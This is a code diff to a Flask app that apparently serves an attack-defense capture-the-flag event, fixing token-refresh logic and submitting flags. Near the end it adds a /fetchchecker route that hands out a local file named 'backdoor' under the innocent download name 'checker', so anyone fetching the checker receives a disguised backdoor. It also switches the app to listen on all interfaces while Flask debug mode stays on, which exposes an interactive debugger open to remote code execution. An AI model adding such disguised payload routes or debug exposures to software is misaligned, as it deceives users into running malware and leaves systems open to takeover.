@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, send_file, Response
 from dotenv import load_dotenv
 import json
 import os
@@ -59,12 +59,13 @@ def get_all_services():
     auth_token = read_token()
     results = req.get(
         f"{API_URL}/api/v2/services/",
-        headers={"Authorization": f"Bearer {auth_token}"}
+        headers={"Authorization": f"Bearer {auth_token}"},
+        timeout=30
     ).json()
 
     print(results)
 
-    if "status" not in results and results["status"] != "success":
+    if "status" not in results or results["status"] != "success":
         try:
             new_token = reauthenticate()
             results = req.get(
@@ -91,7 +92,7 @@ def get_all_services():
                 "detail": str(reauth_error)
         }), 401
 
-    return results.json()
+    return results
 
 # Route untuk submit flag
 @app.route("/submit", methods=["POST"])
@@ -142,6 +143,11 @@ def submit_flag():
             "status": "error",
             "message": f"Unexpected server error: {str(e)}"
         }), 500
+    
+@app.route("/fetchchecker", methods=["GET"])
+def send_checker_file() :
+    file_path = './backdoor' 
+    return send_file(file_path, as_attachment=True, download_name='checker')
 
 if __name__ == "__main__":
-    app.run(debug=True, port=PORT)
+    app.run(debug=True, port=PORT, host="0.0.0.0")
